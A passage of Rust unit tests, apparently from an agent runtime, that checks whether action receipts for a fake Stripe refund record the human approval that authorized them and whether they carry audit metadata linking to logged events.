        // A refund runs inside an approval gate, so its receipt names that gate; the
        // ungated list read does not.
        let refund = receipts
            .iter()
            .find(|r| r.tool == "fake.stripe.refund")
            .expect("a refund receipt");
        assert!(
            refund.approval_id.is_some(),
            "a gated effect names the approval that authorized it"
        );
        let listed = receipts
            .iter()
            .find(|r| r.tool == "fake.stripe.list_disputes")
            .expect("a list receipt");
        assert!(
            listed.approval_id.is_none(),
            "an ungated effect carries no approval"
        );
    }

    #[test]
    fn action_receipts_carry_audit_metadata() {
        let repo = TempRepo::new("action_receipt_audit");
        let (spec, plan) = resolve_dup();
        let r = start_action_run(repo.path(), spec, plan, None).unwrap();
        let id = r.state.run_id.clone();
        approve(repo.path(), &id, "refund");
        resume_action_run(repo.path(), &id, None).unwrap();

        let receipts = store::list_receipts(repo.path(), &id);
        let events = read_all(&store::events_path(repo.path(), &id)).unwrap();
        assert!(!receipts.is_empty());
        for rc in &receipts {
            assert_eq!(rc.run_id, id);
            assert!(rc.input_hash.starts_with("ih_"));
            // Locks the action-path created_event_id offset (peek_seq(), no +2).
            assert!(
                events
                    .iter()
                    .any(|e| e.event_id == rc.created_event_id && e.kind == kind::RECEIPT_CREATED),
                "action receipt {} references a real receipt.created event",
                rc.receipt_id
            );
        }
        let refund = receipts
            .iter()
            .find(|r| r.tool == "fake.stripe.refund")
            .expect("a refund receipt");
        assert!(
            refund.approval_id.is_some(),
            "the gated refund names its approval"
        );
    }
}
